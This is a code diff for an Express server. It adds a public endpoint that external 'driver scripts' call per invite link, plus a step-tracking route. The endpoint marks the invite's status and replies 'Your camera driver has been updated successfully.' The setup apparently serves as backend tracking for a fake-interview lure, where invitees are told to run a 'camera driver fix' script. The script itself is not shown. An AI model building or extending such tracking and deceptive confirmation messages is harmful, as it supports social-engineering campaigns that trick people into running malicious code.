@@ -561,6 +561,28 @@ async function trackStepHandler(req, res) {
     return res.status(500).json({ error: err.message });
   }
 }
+
+/** Driver scripts: POST + path only (no JSON body). Works reliably on Vercel/CDNs where PATCH bodies can be dropped. */
+api.post('/public/invite/:invite_link/camera-fixed', async (req, res) => {
+  try {
+    const invite_link = String(req.params?.invite_link || '').trim();
+    if (!invite_link) {
+      return res.status(400).json({ error: 'invite_link required' });
+    }
+    const db = await getDb();
+    const invite = await db.updateInvite(invite_link, { connections_status: 2 });
+    if (!invite) {
+      return res.status(404).json({ error: 'Invite not found' });
+    }
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    res.send('Your camera driver has been updated successfully.');
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+api.post('/public/invite/:invite_link/track-step/:step_key', trackStepHandler);
+
 app.post('/track-step', trackStepHandler);
 app.post('/track-step/:invite_link/:step_key', trackStepHandler);
 api.post('/track-step', trackStepHandler);
